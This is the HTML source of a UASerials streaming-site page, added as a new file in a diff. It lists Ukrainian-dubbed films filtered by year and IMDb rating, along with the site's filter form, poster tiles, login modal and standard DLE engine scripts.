@@ -1,0 +1,754 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+
+<link href="/templates/uaserials2020/css/styles.min.css?v52" rel="preload" as="style">
+<link rel="preload" href="/assets/fonts/montserrat_c.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+<link rel="preload" href="/assets/fonts/montserrat_ce.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+<link rel="preload" href="/assets/fonts/montserrat_l.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+<link rel="preload" href="/assets/fonts/montserrat_le.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+<link rel="preload" href="https://cdn77.aj1907.online/63c0d7d8.js" as="script">
+
+<link href="/media/default.png" rel="preload" as="image">
+
+
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Фiльтр</title>
+<meta name="charset" content="utf-8">
+<meta name="title" content="Фiльтр">
+<meta name="description" content="Фiльтр">
+<meta name="keywords" content="Фiльтр">
+<link rel="canonical" href="https://uaserials.pro/films/f/r.imdb=0;10/r.year=2010;2023/sort=date/order=desc/">
+<link rel="search" type="application/opensearchdescription+xml" title="UASerials — серіали та фільми українською мовою онлайн" href="https://uaserials.pro/index.php?do=opensearch">
+<link rel="preconnect" href="https://uaserials.pro/" fetchpriority="high">
+<meta property="twitter:card" content="summary">
+<meta property="twitter:title" content="Фiльтр">
+<meta property="twitter:description" content="Фiльтр">
+<meta property="og:type" content="article">
+<meta property="og:site_name" content="UASerials — серіали та фільми українською мовою онлайн">
+<meta property="og:title" content="Фiльтр">
+<meta property="og:description" content="Фiльтр">
+<link rel="shortcut icon" href="/templates/uaserials2020/images/favicon.png">
+
+
+<link href="/templates/common/css/ask_modal.css" type="text/css" rel="stylesheet">
+<link href="/templates/uaserials2020/css/styles.min.css?v52" type="text/css" rel="stylesheet">
+<link href="/templates/uaserials2020/css/engine.min.css?v4" type="text/css" rel="stylesheet">
+<link href="/templates/uaserials2020/css/filter.min.css?v6" type="text/css" rel="stylesheet">
+
+<link rel="preconnect" href="https://hdvbua.pro/">
+<link rel="preconnect" href="https://cdn.hdvbua.pro/">
+<link rel="preconnect" href="https://s1.hdvbua.pro/">
+<link rel="preconnect" href="https://stat.hdvbua.pro/">
+<link rel="preconnect" href="https://aj1907.online/">
+<link rel="preconnect" href="https://cdn77.aj1907.online/">
+<link rel="preconnect" href="https://cdn77-fs.aj1907.online/">
+<link rel="preconnect" href="https://uaserials.pro/">
+<link rel="dns-prefetch" href="https://hdvbua.pro/">
+<link rel="dns-prefetch" href="https://cdn.hdvbua.pro/">
+<link rel="dns-prefetch" href="https://s1.hdvbua.pro/">
+<link rel="dns-prefetch" href="https://stat.hdvbua.pro/">
+<link rel="dns-prefetch" href="https://aj1907.online/">
+<link rel="dns-prefetch" href="https://cdn77.aj1907.online/">
+<link rel="dns-prefetch" href="https://cdn77-fs.aj1907.online/">
+<link rel="dns-prefetch" href="https://uaserials.pro/">
+<meta name="theme-color" content="#f5f6f8">
+
+<style>
+@media(max-width:768px) {body {padding-top: 90px}}
+@font-face{font-family:Montserrat;font-style:normal;font-weight:100 900;font-display:swap;src:url(/assets/fonts/montserrat_ce.woff2) format('woff2');unicode-range:U+0460-052F,U+1C80-1C8A,U+20B4,U+2DE0-2DFF,U+A640-A69F,U+FE2E-FE2F}@font-face{font-family:Montserrat;font-style:normal;font-weight:100 900;font-display:swap;src:url(/assets/fonts/montserrat_c.woff2) format('woff2');unicode-range:U+0301,U+0400-045F,U+0490-0491,U+04B0-04B1,U+2116}@font-face{font-family:Montserrat;font-style:normal;font-weight:100 900;font-display:swap;src:url(/assets/fonts/montserrat_l.woff2) format('woff2');unicode-range:U+0100-02BA,U+02BD-02C5,U+02C7-02CC,U+02CE-02D7,U+02DD-02FF,U+0304,U+0308,U+0329,U+1D00-1DBF,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20C0,U+2113,U+2C60-2C7F,U+A720-A7FF}@font-face{font-family:Montserrat;font-style:normal;font-weight:100 900;font-display:swap;src:url(/assets/fonts/montserrat_le.woff2) format('woff2');unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD}@font-face{font-family:'Font Awesome 5 Brands';font-style:normal;font-weight:400;font-display:swap;src:url(/templates/uaserials2020/webfonts/fa-brands-400.woff2) format("woff2"),url(/templates/uaserials2020/webfonts/fa-brands-400.woff) format("woff")}@font-face{font-family:'Font Awesome 5 Pro';font-style:normal;font-weight:300;font-display:swap;src:url(/templates/uaserials2020/webfonts/fa-light-300.woff2) format("woff2"),url(/templates/uaserials2020/webfonts/fa-light-300.woff) format("woff")}@font-face{font-family:'Font Awesome 5 Pro';font-style:normal;font-weight:400;font-display:swap;src:url(/templates/uaserials2020/webfonts/fa-regular-400.woff2) format("woff2"),url(/templates/uaserials2020/webfonts/fa-regular-400.woff) format("woff")}@font-face{font-family:'Font Awesome 5 Pro';font-style:normal;font-weight:900;font-display:swap;src:url(/templates/uaserials2020/webfonts/fa-solid-900.woff2) format("woff2"),url(/templates/uaserials2020/webfonts/fa-solid-900.woff) format("woff")}.fa,.fab,.fad,.fal,.far,.fas{-moz-osx-font-smoothing:grayscale;-webkit-font-smoothing:antialiased;display:inline-block;font-style:normal;font-variant:normal;text-rendering:auto;line-height:1}.fab{font-family:'Font Awesome 5 Brands'}.fa,.fal,.far,.fas{font-family:'Font Awesome 5 Pro'}.fal{font-weight:300}.far{font-weight:400}.fa,.fas{font-weight:900}.fa-search:before{content:"\f002"}.fa-album-collection:before{content:"\f8a0"}.fa-tv:before{content:"\f26c"}.fa-film:before{content:"\f008"}.fa-video:before{content:"\f03d"}.fa-play:before{content:"\f04b"}.fa-paper-plane:before{content:"\f1d8"}.fa-twitter:before{content:"\f099"}.fa-facebook-f:before{content:"\f39e"}.fa-comment-dots:before{content:"\f4ad"}.fa-thumbs-down:before{content:"\f165"}.fa-thumbs-up:before{content:"\f164"}.fa-cog:before{content:"\f013"}.fa-long-arrow-up:before{content:"\f176"}.fa-sign-out:before{content:"\f08b"}.fa-ban:before{content:"\f05e"}.fa-filter:before{content:"\f0b0"}
+</style>
+<script>
+    window.readTheme = function() {
+        return localStorage.getItem('uas-theme') || 'light';
+    };
+
+    window.applyTheme = function(theme) {
+        var body = document.body;
+        
+
+        body && body.setAttribute('theme', theme);
+        
+    };
+
+    window.changeTheme = function(theme) {
+        theme = theme == 'light' || theme == 'dark' ? theme : null;
+
+        if(theme) {
+            localStorage.setItem('uas-theme', theme);
+            window.applyTheme(theme);
+        }
+    }
+
+    let lazyScriptsSwitcher = true;
+    let arrayToLazyLoad = [];
+    
+</script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-3SG6QTBZ05');
+</script>
+</head>
+<body>
+
+
+<script>window.applyTheme(window.readTheme());</script>
+<div class="wrap">
+    <div class="wrap-main wrap-center">
+        <header class="header fx-row fx-middle">
+            <a href="/" class="logo nowrap"><span>UA</span>Serials</a>
+			<div class="search-wrap fx-1" style="display: flex; align-items: center;">
+				<form id="quicksearch" method="post" style="flex: 1; ">
+					<input type="hidden" name="do" value="search" />
+					<input type="hidden" name="subaction" value="search" />
+					<div class="search-box" style="position: relative;">
+						<input id="story" name="story" placeholder="Пошук..." type="text" />
+						<button type="submit" class="search-btn" aria-label="Пошук"><span class="fal fa-search"></span></button>
+					</div>
+				</form>
+                <div class="theme-switcher" style="margin-left: 20px;">
+                    <input type="checkbox" id="switcher">
+                    <label for="switcher"><span></span></label>
+                </div>
+			</div>
+            <div class="header-btn btn js-login">Вхід</div>
+            
+        </header>
+        <!-- END HEADER -->
+
+        <div class="carou-sect">
+            <ul class="menunav_top">
+                <li><a href="/series/">Серіали</a></li>
+                <li><a href="/cartoons/">Мультсеріали</a></li>
+                <li><a href="/films/">Фільми</a></li>
+                <li><a href="/fcartoon/">Мультфільми</a></li>
+                <li><a href="/collections/">Добірки</a></li>
+                <li class="last"><a href="/list/">Мої списки</a></li>
+            </ul>
+        </div>
+
+		<div class="cols fx-row">
+			<!-- END SIDEBAR -->
+            <!---->
+			<main class="fx-1">
+                
+                
+                
+                    <div class="sect-header fx-row fx-middle">
+    <div class="sect-title fx-1 nowrap"><span class="fal fa-film"></span><h1 style="display:contents">Дивитися фільми онлайн українською в HD якості</h1></div>
+</div>
+
+<div class="filter-block">
+    <div class="filter-toolbar btn"><span class="fal fa-filter"></span><span class="filter-filter-name">Фільтр</span></div>
+	<div class="filter-content">
+			
+<form data-dlefilter="dle-filter"{* data-filter-mod="filter-mod"*}>
+	<div class="filter-wrap" id="filter-wrap">
+		<div class="filter-box fx-row">
+		
+		<div class="fb-col" style="width: 40%;">
+			<div class="fb-sect-name">Виберіть рік</div>
+			<div class="fb-sect">
+
+                <div class="fx-row" style="justify-content: space-around;flex-direction: row;">
+                    <div style="width: 73px;">
+                        <select class="choose-single" 
+                                data-name="select-year-from" 
+                                data-type="get"
+                                data-slider-id="year" 
+                                data-index="0"
+                                data-placeholder="рік">
+                        </select>
+                    </div>
+                    <div style="flex:1; margin: 4px 20px;">
+                        <input name="r.year" id="year" data-slider-config="Двойной слайдер;Минимальное значение:1920;Максимальное значение:2025;Начало слайдера:1920;Конец слайдера:2025;Шаг:1;" value="" type="text">
+                    </div>
+                    <div style="width: 73px;">
+                        <select class="choose-single"
+                                data-name="select-year-to" 
+                                data-type="get"
+                                data-index="1"
+                                data-slider-id="year" 
+                                data-placeholder="рік">
+                        </select>
+                    </div>
+                </div>
+            </div>
+            
+			<div class="fb-sect-name">Виберіть рейтинг IMDb</div>
+            <div class="fb-sect">
+                <div class="fx-row" style="justify-content: space-around;flex-direction: row;">
+                    <div style="width: 73px;">
+                        <select class="choose-single" 
+                                data-name="select-imdb-from" 
+                                data-slider-id="imdb" 
+                                data-placeholder="imdb">
+                        </select>
+                    </div>
+                    <div style="flex:1; margin: 4px 20px;">
+                        <input name="r.imdb" id="imdb" data-slider-config="Двойной слайдер;Минимальное значение:0;Максимальное значение:10;Начало слайдера:0;Конец слайдера:10;Шаг:1;" value="" type="text">
+                    </div>
+                    <div style="width: 73px;">
+                        <select class="choose-single"
+                                data-name="select-imdb-to" 
+                                data-slider-id="imdb" 
+                                data-placeholder="imdb">
+                        </select>
+                    </div>
+                </div>
+			</div>
+			
+
+		</div>
+		
+		<div class="fb-col">
+			<div class="fb-sect-name" style="margin:0">Виберіть жанр або країну</div>
+			<div class="fb-sect">
+	
+				<select data-type="get" name="cat" data-placeholder="Жанр" class="choose-multiple" multiple="true">
+					<option></option>
+                    <option value="39">Історичний</option><option value="32">Трилер</option><option value="33">Кримінал</option><option value="34">Бойовик</option><option value="37">Жахи</option><option value="38">Фентезі</option><option value="40">Військовий</option><option value="41">Фантастика</option><option value="42">Музичний</option><option value="43">Мелодрама</option><option value="44">Детектив</option><option value="45">Сімейний</option><option value="46">Вестерн</option><option value="47">Спортивний</option><option value="48">Мюзикл</option><option value="49">Документальний</option><option value="51">Короткометражний</option><option value="9">Комедія</option><option value="10">Пригоди</option><option value="11">Драма</option><option value="12">Біографічний</option>				</select>
+
+				<select data-type="get" name="country" data-placeholder="Країна" class="choose-multiple" multiple="true">
+					<option></option>
+                    <option>США</option>
+                    <option>Велика Британія</option>
+					<option>Австралія</option>
+                    <option>Австрія</option>
+                    <option>Аргентина</option>
+                    <option>Багами</option>
+                    <option>Бельгія</option>
+                    <option>Болгарія</option>
+                    <option>Бразилія</option>
+                    <option>Гонконг</option>
+                    <option>Греція</option>
+                    <option>Данія</option>
+                    <option>Ізраїль</option>
+                    <option>Індія</option>
+                    <option>Індонезія</option>
+                    <option>Ірландія</option>
+                    <option>Ісландія</option>
+                    <option>Іспанія</option>
+                    <option>Італія</option>
+                    <option>Йорданія</option>
+                    <option>Камбоджа</option>
+                    <option>Канада</option>
+                    <option>Катар</option>
+                    <option>Кенія</option>
+                    <option>Китай</option>
+                    <option>Колумбія</option>
+                    <option>Люксембург</option>
+                    <option>Мальта</option>
+                    <option>Марокко</option>
+                    <option>Мексика</option>
+                    <option>Монако</option>
+                    <option>Монголія</option>
+                    <option>Непал</option>
+                    <option>Нідерланди</option>
+                    <option>Німеччина</option>
+                    <option>Нова Зеландія</option>
+                    <option>Норвегія</option>
+                    <option>ОАЕ</option>
+                    <option>ПАР</option>
+                    <option>Перу</option>
+                    <option>Південна Корея</option>
+                    <option>Польща</option>
+                    <option>Португалія</option>
+                    <option>Росія</option>
+                    <option>Румунія</option>
+                    <option>Сербія</option>
+                    <option>Сінгапур</option>
+                    <option>Словаччина</option>
+                    <option>СРСР</option>
+                    <option>СФРЮ</option>
+                    <option>Таїланд</option>
+                    <option>Тайвань</option>
+                    <option>Туреччина</option>
+                    <option>Туніс</option>
+                    <option>Угорщина</option>
+                    <option>Україна</option>
+                    <option>Фінляндія</option>
+                    <option>Франція</option>
+                    <option>ФРН</option>
+                    <option>Чехія</option>
+                    <option>Чехословаччина</option>
+                    <option>Чилі</option>
+                    <option>Швейцарія</option>
+                    <option>Швеція</option>
+                    <option>Югославія</option>
+                    <option>Японія</option>
+				</select>
+                    			</div>
+
+            </div>
+    		
+    		<div class="fb-col" style="width: 25%;">
+    			<div class="fb-sect-name">Останній крок</div>
+    			<div class="fb-submit">
+    				<input type="button" data-dlefilter="submit" {*data-filter-mod="submit"*} value="Пошук"><br>
+    				<input type="button" data-dlefilter="reset" {*data-filter-mod="reset"*} value="Очистити">
+    			</div>
+    		</div>
+		</div>
+	</div>
+</form>
+
+	</div>
+</div>
+
+<div class="sect-content">
+    <div id="dle-content"><!-- DLE Filter by LazyDev.pro --><div class="short-item width-16">
+	<div class="short-cols fx-row">
+		<a class="short-img img-fit" href="https://uaserials.pro/9665-lubov-dlia-doroslykh.html">
+			<img src="/posters/9665.webp" alt="Любов для дорослих" width="250" height="345">
+            
+        	
+            <div class="short-mask"><span class="fa fa-play"></span></div>
+		</a>
+        <div class="th-title truncate" align="center">Любов для дорослих</div>
+        <div class="th-title-oname truncate" align="center">Kærlighed for voksne</div>
+	</div>
+</div><div class="short-item width-16">
+	<div class="short-cols fx-row">
+		<a class="short-img img-fit" href="https://uaserials.pro/9635-rizdviane-menu.html">
+			<img class="lazyload" src="/media/default.png" loading="lazy" data-src="/posters/9635.webp" alt="Різдвяне меню" width="250" height="345">
+            
+        	
+            <div class="short-mask"><span class="fa fa-play"></span></div>
+		</a>
+        <div class="th-title truncate" align="center">Різдвяне меню</div>
+        <div class="th-title-oname truncate" align="center">Christmas à La Carte</div>
+	</div>
+</div><div class="short-item width-16">
+	<div class="short-cols fx-row">
+		<a class="short-img img-fit" href="https://uaserials.pro/9636-rizdvo-u-vashyngtoni.html">
+			<img class="lazyload" src="/media/default.png" loading="lazy" data-src="/posters/9636.webp" alt="Різдво у Вашингтоні" width="250" height="345">
+            
+        	
+            <div class="short-mask"><span class="fa fa-play"></span></div>
+		</a>
+        <div class="th-title truncate" align="center">Різдво у Вашингтоні</div>
+        <div class="th-title-oname truncate" align="center">Christmas in Washington</div>
+	</div>
+</div><div class="short-item width-16">
+	<div class="short-cols fx-row">
+		<a class="short-img img-fit" href="https://uaserials.pro/9638-u-bilomu-poloni.html">
+			<img class="lazyload" src="/media/default.png" loading="lazy" data-src="/posters/9638.webp" alt="У білому полоні" width="250" height="345">
+            
+        	
+            <div class="short-mask"><span class="fa fa-play"></span></div>
+		</a>
+        <div class="th-title truncate" align="center">У білому полоні</div>
+        <div class="th-title-oname truncate" align="center">Into the White</div>
+	</div>
+</div><div class="short-item width-16">
+	<div class="short-cols fx-row">
+		<a class="short-img img-fit" href="https://uaserials.pro/9584-shchyre-rizdvo.html">
+			<img class="lazyload" src="/media/default.png" loading="lazy" data-src="/posters/9584.webp" alt="Щире Різдво" width="250" height="345">
+            
+        	
+            <div class="short-mask"><span class="fa fa-play"></span></div>
+		</a>
+        <div class="th-title truncate" align="center">Щире Різдво</div>
+        <div class="th-title-oname truncate" align="center">Sincerely Christmas</div>
+	</div>
+</div><div class="short-item width-16">
+	<div class="short-cols fx-row">
+		<a class="short-img img-fit" href="https://uaserials.pro/9582-lider-peregoniv.html">
+			<img class="lazyload" src="/media/default.png" loading="lazy" data-src="/posters/9582.webp" alt="Лідер перегонів" width="250" height="345">
+            
+        	
+            <div class="short-mask"><span class="fa fa-play"></span></div>
+		</a>
+        <div class="th-title truncate" align="center">Лідер перегонів</div>
+        <div class="th-title-oname truncate" align="center">The Front Runner</div>
+	</div>
+</div><div class="short-item width-16">
+	<div class="short-cols fx-row">
+		<a class="short-img img-fit" href="https://uaserials.pro/9581-mynuloi-nochi-v-nu-iorku.html">
+			<img class="lazyload" src="/media/default.png" loading="lazy" data-src="/posters/9581.webp" alt="Минулої ночі в Нью-Йорку" width="250" height="345">
+            
+        	
+            <div class="short-mask"><span class="fa fa-play"></span></div>
+		</a>
+        <div class="th-title truncate" align="center">Минулої ночі в Нью-Йорку</div>
+        <div class="th-title-oname truncate" align="center">Last Night</div>
+	</div>
+</div><div class="short-item width-16">
+	<div class="short-cols fx-row">
+		<a class="short-img img-fit" href="https://uaserials.pro/9578-shcho-vidbuvaietsia-potim.html">
+			<img class="lazyload" src="/media/default.png" loading="lazy" data-src="/posters/9578.webp" alt="Що відбувається потім" width="250" height="345">
+            
+        	
+            <div class="short-mask"><span class="fa fa-play"></span></div>
+		</a>
+        <div class="th-title truncate" align="center">Що відбувається потім</div>
+        <div class="th-title-oname truncate" align="center">What Happens Later</div>
+	</div>
+</div><div class="short-item width-16">
+	<div class="short-cols fx-row">
+		<a class="short-img img-fit" href="https://uaserials.pro/9565-naodynci-zi-smertu.html">
+			<img class="lazyload" src="/media/default.png" loading="lazy" data-src="/posters/9565.webp" alt="Наодинці зі смертю" width="250" height="345">
+            
+        	
+            <div class="short-mask"><span class="fa fa-play"></span></div>
+		</a>
+        <div class="th-title truncate" align="center">Наодинці зі смертю</div>
+        <div class="th-title-oname truncate" align="center">East of the Mountains</div>
+	</div>
+</div><div class="short-item width-16">
+	<div class="short-cols fx-row">
+		<a class="short-img img-fit" href="https://uaserials.pro/9569-ferrari.html">
+			<img class="lazyload" src="/media/default.png" loading="lazy" data-src="/posters/9569.webp" alt="Феррарі" width="250" height="345">
+            
+        	
+            <div class="short-mask"><span class="fa fa-play"></span></div>
+		</a>
+        <div class="th-title truncate" align="center">Феррарі</div>
+        <div class="th-title-oname truncate" align="center">Ferrari</div>
+	</div>
+</div><div class="short-item width-16">
+	<div class="short-cols fx-row">
+		<a class="short-img img-fit" href="https://uaserials.pro/9587-riznyky.html">
+			<img class="lazyload" src="/media/default.png" loading="lazy" data-src="/posters/9587.webp" alt="Різники" width="250" height="345">
+            
+        	
+            <div class="short-mask"><span class="fa fa-play"></span></div>
+		</a>
+        <div class="th-title truncate" align="center">Різники</div>
+        <div class="th-title-oname truncate" align="center">Home Kills</div>
+	</div>
+</div><div class="short-item width-16">
+	<div class="short-cols fx-row">
+		<a class="short-img img-fit" href="https://uaserials.pro/9589-gurkit-kriz-temriavu.html">
+			<img class="lazyload" src="/media/default.png" loading="lazy" data-src="/posters/9589.webp" alt="Гуркіт крізь темряву" width="250" height="345">
+            
+        	
+            <div class="short-mask"><span class="fa fa-play"></span></div>
+		</a>
+        <div class="th-title truncate" align="center">Гуркіт крізь темряву</div>
+        <div class="th-title-oname truncate" align="center">Rumble Through the Dark</div>
+	</div>
+</div><div class="short-item width-16">
+	<div class="short-cols fx-row">
+		<a class="short-img img-fit" href="https://uaserials.pro/9601-ostannia-sprava-mistera-monka.html">
+			<img class="lazyload" src="/media/default.png" loading="lazy" data-src="/posters/9601.webp" alt="Остання справа містера Монка" width="250" height="345">
+            
+        	
+            <div class="short-mask"><span class="fa fa-play"></span></div>
+		</a>
+        <div class="th-title truncate" align="center">Остання справа містера Монка</div>
+        <div class="th-title-oname truncate" align="center">Mr. Monk's Last Case: A Monk Movie</div>
+	</div>
+</div><div class="short-item width-16">
+	<div class="short-cols fx-row">
+		<a class="short-img img-fit" href="https://uaserials.pro/9610-dzhyn.html">
+			<img class="lazyload" src="/media/default.png" loading="lazy" data-src="/posters/9610.webp" alt="Джин" width="250" height="345">
+            
+        	
+            <div class="short-mask"><span class="fa fa-play"></span></div>
+		</a>
+        <div class="th-title truncate" align="center">Джин</div>
+        <div class="th-title-oname truncate" align="center">Genie</div>
+	</div>
+</div><div class="short-item width-16">
+	<div class="short-cols fx-row">
+		<a class="short-img img-fit" href="https://uaserials.pro/9611-sekretna-shtab-kvartyra.html">
+			<img class="lazyload" src="/media/default.png" loading="lazy" data-src="/posters/9611.webp" alt="Секретна штаб-квартира" width="250" height="345">
+            
+        	
+            <div class="short-mask"><span class="fa fa-play"></span></div>
+		</a>
+        <div class="th-title truncate" align="center">Секретна штаб-квартира</div>
+        <div class="th-title-oname truncate" align="center">Secret Headquarters</div>
+	</div>
+</div><div class="short-item width-16">
+	<div class="short-cols fx-row">
+		<a class="short-img img-fit" href="https://uaserials.pro/9516-vechirnia-shkola.html">
+			<img class="lazyload" src="/media/default.png" loading="lazy" data-src="/posters/9516.webp" alt="Вечірня школа" width="250" height="345">
+            
+        	
+            <div class="short-mask"><span class="fa fa-play"></span></div>
+		</a>
+        <div class="th-title truncate" align="center">Вечірня школа</div>
+        <div class="th-title-oname truncate" align="center">Night School</div>
+	</div>
+</div><div class="short-item width-16">
+	<div class="short-cols fx-row">
+		<a class="short-img img-fit" href="https://uaserials.pro/9536-zlamani.html">
+			<img class="lazyload" src="/media/default.png" loading="lazy" data-src="/posters/9536.webp" alt="Зламані" width="250" height="345">
+            
+        	
+            <div class="short-mask"><span class="fa fa-play"></span></div>
+		</a>
+        <div class="th-title truncate" align="center">Зламані</div>
+        <div class="th-title-oname truncate" align="center">Broken</div>
+	</div>
+</div><div class="short-item width-16">
+	<div class="short-cols fx-row">
+		<a class="short-img img-fit" href="https://uaserials.pro/9551-stvoruiemo-rizdviane-sviato.html">
+			<img class="lazyload" src="/media/default.png" loading="lazy" data-src="/posters/9551.webp" alt="Створюємо Різдвяне свято" width="250" height="345">
+            
+        	
+            <div class="short-mask"><span class="fa fa-play"></span></div>
+		</a>
+        <div class="th-title truncate" align="center">Створюємо Різдвяне свято</div>
+        <div class="th-title-oname truncate" align="center">Creating Christmas</div>
+	</div>
+</div><!--ENGINE_NAVIGATION--><!-- noindex -->
+
+
+<center style="margin-bottom: 16px; display: block; flex: 1 0 100%; max-width: 100%;">
+    <div style="text-align: center;">
+        <div id="bc6dc2f5ad" style="display: none"></div>
+    </div>
+</center>
+
+<!-- /noindex -->
+<!--noindex-->
+<div class="bottom-nav clr ignore-select" id="bottom-nav">
+	<div class="navigation fx-row fx-center"><span>1</span> <a href="https://uaserials.pro/films/f/r.imdb=0;10/r.year=2010;2023/sort=date/order=desc/page/2/">2</a> <a href="https://uaserials.pro/films/f/r.imdb=0;10/r.year=2010;2023/sort=date/order=desc/page/3/">3</a> <a href="https://uaserials.pro/films/f/r.imdb=0;10/r.year=2010;2023/sort=date/order=desc/page/4/">4</a> <a href="https://uaserials.pro/films/f/r.imdb=0;10/r.year=2010;2023/sort=date/order=desc/page/5/">5</a> <a href="https://uaserials.pro/films/f/r.imdb=0;10/r.year=2010;2023/sort=date/order=desc/page/6/">6</a> <a href="https://uaserials.pro/films/f/r.imdb=0;10/r.year=2010;2023/sort=date/order=desc/page/7/">7</a> <a href="https://uaserials.pro/films/f/r.imdb=0;10/r.year=2010;2023/sort=date/order=desc/page/8/">8</a> <a href="https://uaserials.pro/films/f/r.imdb=0;10/r.year=2010;2023/sort=date/order=desc/page/9/">9</a> <a href="https://uaserials.pro/films/f/r.imdb=0;10/r.year=2010;2023/sort=date/order=desc/page/10/">10</a> <span class="nav_ext">...</span> <a href="https://uaserials.pro/films/f/r.imdb=0;10/r.year=2010;2023/sort=date/order=desc/page/202/">202</a></div>
+</div>
+<!--/noindex--><!--/ENGINE_NAVIGATION--><!-- DLE Filter by LazyDev.pro --></div>
+</div>
+<div class="site-desc clearfix">
+    
+</div>
+                
+                
+                
+                
+                
+
+                <!-- <div class="site-desc clearfix"> </div> -->
+            </main>
+            <!-- END MAIN -->
+        </div>
+        <!-- END COLS -->
+		
+		<footer class="footer fx-row fx-middle">
+			<div class="footer-copyright fx-1">
+				© 2025, UASerials.pro — твої улюблені серіали українською мовою онлайн
+			</div>
+			<a href="/index.php?do=feedback">Зворотній зв′язок</a>
+			<a href="/abuse.html">Правовласникам</a>
+		</footer>
+        <!-- END FOOTER -->
+    </div>
+    <!-- END WRAP-MAIN -->
+</div>
+<!-- END WRAP -->
+		
+<!--noindex-->
+
+
+<div class="login-box not-logged hidden">
+	<div class="login-close"><span class="fal fa-times"></span></div>
+	<form method="post">
+		<div class="login-title title">Авторизація</div>
+		<div class="login-avatar"><span class="fal fa-user"></span></div>
+		<div class="login-input"><input type="text" name="login_name" id="login_name" autocomplete="username" placeholder="Ваш логін"/></div>
+		<div class="login-input"><input type="password" name="login_password" id="login_password" autocomplete="current-password" placeholder="Ваш пароль" /></div>
+		<div class="login-check">
+			<label for="login_not_save">
+				<input type="checkbox" name="login_not_save" id="login_not_save" value="1"/>
+				<span>Запам'ятати</span>
+			</label> 
+		</div>
+		<div class="login-btn"><button onclick="submit();" type="submit" title="Вход">Увійти на сайт</button></div>
+		<input name="login" type="hidden" id="login" value="submit" />
+		<div class="login-btm fx-row fx-between">
+			<a href="https://uaserials.pro/index.php?do=register" class="log-register">Реєстрація</a>
+			<a href="https://uaserials.pro/index.php?do=lostpassword">Забули пароль?</a>
+		</div>
+         <!-- --> 
+        <p style="margin: 12px 0 0 0; font-size: 13px; text-align: center;">Дорогі друзі. Ми шкодуємо, але ми втратили всю базу даних. Заведіть новий обліковий запис</p>
+	</form>
+</div>
+
+<!--/noindex-->
+
+<!--noindex-->
+<div class="uas-custom-popup hidden">
+    <div class="uas-c-p-header">
+        <div class="uas-c-p-title"></div>
+        <div class="uas-c-p-close"><span class="fal fa-times"></span></div>
+    </div>
+    <div class="uas-c-p-content"></div>
+</div>
+<div class="uas-custom-overlay" style="display: none;"></div>
+<!--/noindex-->
+
+
+
+
+<script src="/engine/classes/js/jquery.js?v=z3fcy"></script>
+<script src="/engine/classes/js/jqueryui.js?v=z3fcy" defer></script>
+<script src="/engine/classes/js/dle_js.js?v=z3fcy" defer></script>
+<script src="/templates/common/js/polyfills.js"></script>
+<script src="/templates/common/js/tools.min.js?v1"></script>
+<script>
+<!--
+var dle_root       = '/';
+var dle_admin      = '';
+var dle_login_hash = '0972b41a808caf77b4c2570590b814c141b81cb8';
+var dle_group      = 5;
+var dle_skin       = 'uaserials2020';
+var dle_wysiwyg    = '-1';
+var quick_wysiwyg  = '2';
+var dle_min_search = '3';
+var dle_act_lang   = ["Так", "Ні", "Увести", "Скасувати", "Зберегти", "Видалити", "Завантаження. Будь ласка, зачекайте..."];
+var menu_short     = 'Швидке редагування';
+var menu_full      = 'Повне редагування';
+var menu_profile   = 'Перегляд профілю';
+var menu_send      = 'Надіслати повідомлення';
+var menu_uedit     = 'Адмінцентр';
+var dle_info       = 'Інформація';
+var dle_confirm    = 'Підтвердження';
+var dle_prompt     = 'Уведення інформації';
+var dle_req_field  = ["Заповніть поле з ім’ям", "Заповніть поле з повідомленням", "Заповніть поле з темою повідомлення"];
+var dle_del_agree  = 'Ви певні, що хочете видалити? Цю дію неможливо буде скасувати';
+var dle_spam_agree = 'Ви певні, що хочете позначити користувача як спамера? Це призведе до видалення всіх його коментарів';
+var dle_c_title    = 'Надсилання скарги';
+var dle_complaint  = 'Зазначте текст Вашої скарги для адміністрації:';
+var dle_mail       = 'Ваша адреса е-пошти:';
+var dle_big_text   = 'Виділено завеликий клаптик тексту.';
+var dle_orfo_title = 'Зазначте коментар для адміністрації до знайденої помилки на сторінці:';
+var dle_p_send     = 'Надіслати';
+var dle_p_send_ok  = 'Сповіщення вдало надіслано';
+var dle_save_ok    = 'Зміни вдало збережено. Оновити сторінку?';
+var dle_reply_title= 'Відповідь на коментар';
+var dle_tree_comm  = '0';
+var dle_del_news   = 'Видалити статтю';
+var dle_sub_agree  = 'Ви певні, що хочете підписатися на коментарі до цієї публікації?';
+var dle_unsub_agree  = 'Ви дійсно хочете відписатися від коментарів до даної публікації?';
+var dle_captcha_type  = '0';
+var dle_share_interesting  = ["Поділитися посиланням на виділений текст", "Твіттер", "Facebook", "Вконтакті", "Пряме посилання:", "Натисніть правою клавішею миші і виберіть «Копіювати посилання»"];
+var DLEPlayerLang     = {prev: 'Попередній',next: 'Наступний',play: 'Відтворити',pause: 'Пауза',mute: 'Вимкнути звук', unmute: 'Увімкнути звук', settings: 'Налаштування', enterFullscreen: 'На повний екран', exitFullscreen: 'Вимкнути повноекранний режим', speed: 'Швидкість', normal: 'Звичайна', quality: 'Якість', pip: 'Режим PiP'};
+var DLEGalleryLang    = {CLOSE: 'Закрити (Esc)', NEXT: 'Наступне зображення', PREV: 'Попереднє зображення', ERROR: 'Увага! Виявлено помилку', IMAGE_ERROR: 'Не вдалося завантажити зображення', TOGGLE_SLIDESHOW: 'Перегляд слайд-шоу (пропуск)',TOGGLE_FULLSCREEN: 'Повноекранний режим', TOGGLE_THUMBS: 'Увімкнути / вимкнути зменшені копії', ITERATEZOOM: 'Збільшити / Зменшити', DOWNLOAD: 'Завантажити зображення' };
+var DLEGalleryMode    = 0;
+var DLELazyMode       = 0;
+var allow_dle_delete_news   = false;
+
+//-->
